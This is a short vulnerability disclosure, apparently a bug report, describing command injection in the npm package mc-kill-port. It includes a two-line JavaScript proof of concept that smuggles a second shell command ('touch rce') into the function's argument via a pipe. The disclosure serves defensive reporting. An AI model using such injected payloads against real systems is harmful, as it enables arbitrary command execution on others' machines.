 We find a potential command injection vulnerability from from [mc-kill-portmc-kill-port](https://www.npmjs.com/package/mc-kill-port).
The bug is introduced because package-exported method fails to sanitize its parameter and let it flow into a sensitive command execution API.

The following code is the proof of concept.

```javascript
 const kill = require("mc-kill-port");                                                                                                                                                                   
 kill("abc|touch rce")
```
